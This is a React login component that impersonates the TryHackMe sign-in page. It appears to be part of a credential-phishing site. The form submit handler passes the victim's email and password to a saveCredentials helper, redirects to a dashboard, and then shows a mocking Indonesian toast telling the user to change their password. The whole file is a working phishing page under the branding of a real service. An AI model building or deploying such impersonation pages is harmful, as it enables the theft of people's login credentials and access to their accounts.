import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield } from 'lucide-react';
import toast from 'react-hot-toast';
import { saveCredentials } from '../utils/credentials';

const Login = () => {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Save credentials
    const saved = await saveCredentials(email, password);
    
    if (saved) {
      navigate('/dashboard');
      setTimeout(() => {
        toast.error('Hahahaah silahkan ganti password anda', {
          duration: 5000,
        });
      }, 1000);
    }
  };

  return (
    <div className="min-h-screen bg-[#161616] flex items-center justify-center px-4">
      <div className="bg-[#1c1c1c] p-8 rounded-lg w-full max-w-md">
        <div className="flex justify-center mb-6">
          <Shield className="h-12 w-12 text-[#88cc14]" />
        </div>
        
        <h2 className="text-2xl font-bold text-white text-center mb-6">
          Welcome to TryHackMe
        </h2>

        <form onSubmit={handleFormSubmit}>
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-1">
                Email
              </label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-3 py-2 bg-[#161616] border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-[#88cc14]"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-1">
                Password
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 bg-[#161616] border border-gray-600 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-[#88cc14]"
                required
              />
            </div>
            <button
              type="submit"
              className="w-full bg-[#88cc14] text-black py-2 rounded-md font-semibold hover:bg-[#9be016] transition-colors"
            >
              Sign In
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Login;